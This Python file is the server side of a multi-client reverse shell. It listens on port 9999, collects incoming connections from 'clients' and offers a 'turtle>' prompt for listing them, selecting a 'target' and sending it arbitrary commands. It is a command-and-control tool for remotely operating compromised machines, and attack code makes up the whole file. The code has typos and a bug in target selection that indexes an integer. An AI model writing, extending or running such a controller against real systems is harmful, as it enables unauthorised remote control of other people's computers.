import socket 
import sys
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

all_connections = []
all_addresses = []

# create socket (allows two computers to conncect)

def main():
    socket_create()
    socket_bind()
    #socket_accept()

def socket_create():
    try:
        global host 
        global port 
        global s 
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Bind socket to port and wait for onnection from client 
def socket_bind():
    try:
        global host 
        global port 
        global s 
        print("Binding socket to port: " + str(port))
        s.bind((host,port))
        #allows server to accept coonection (5 tries before refeusing)
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying")
        socket_bind()


#Establish a connection with client (socket must be listening for them)

#def socket_accept():
#    conn, address = s.accept()
#    print("Connection has been established | " + " IP " + address[0] + " | Port " + str(address[1]))
#    send_commands(conn)
#    conn.close()

#accept connections from multiple cleints and save to list
def accecpt_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established " + address[0])
        except:
            print("Error accepting connections")

#Interactive prompt for sending commands remotely 
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd =='list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

#displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('------- Clients -------' + '\n' + results)

#select target (client)
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print('you are now connected to ' + str(all_addresses[target[0]]))
        print(str(all_addresses[target[0]]) + '> ', end="")
        return conn
    except:
        print("Not a valid slecetion")
        return None

#Connect to remote target client 
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break
            
#Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target = work)
        #if main program dies, no subprocess continues 
        t.daemon = True
        t.start()

#Do the next job in the que (one handles connections the other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accecpt_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

#Each list item is a new Job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()

#send commands
#def send_commands(conn):
#    while True:
#        cmd = input()
#        if cmd == 'exit':
#            conn.close()
#            s.close()
#            sys.exit()
#        if len(str.encode(cmd)) > 0:
#            conn.send(str.encode(cmd))
#            client_response = str(conn.recv(1024), "utf-8")
#            print(client_response , end="")

main()